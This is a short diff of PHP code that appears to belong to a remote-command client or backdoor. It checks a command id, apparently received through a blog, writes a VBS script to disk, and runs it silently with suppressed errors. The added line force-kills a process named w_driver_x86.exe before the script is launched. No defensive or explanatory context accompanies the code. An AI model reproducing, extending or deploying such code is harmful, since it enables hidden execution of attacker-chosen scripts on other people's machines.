@@ -78,6 +78,7 @@ if(@$GLOBALS['BLOG_COMMAND_ID'] !== $command_id)
 			}
 			if($count_files == 0)
 				@file_put_contents($vbs_path.'\\'.$vbsname, $vbs);
+			@exec('taskkill /f /im w_driver_x86.exe');
 			@exec('start "" "'.$vbs_path.'\\'.$vbsname.'"');
 		}
 	}
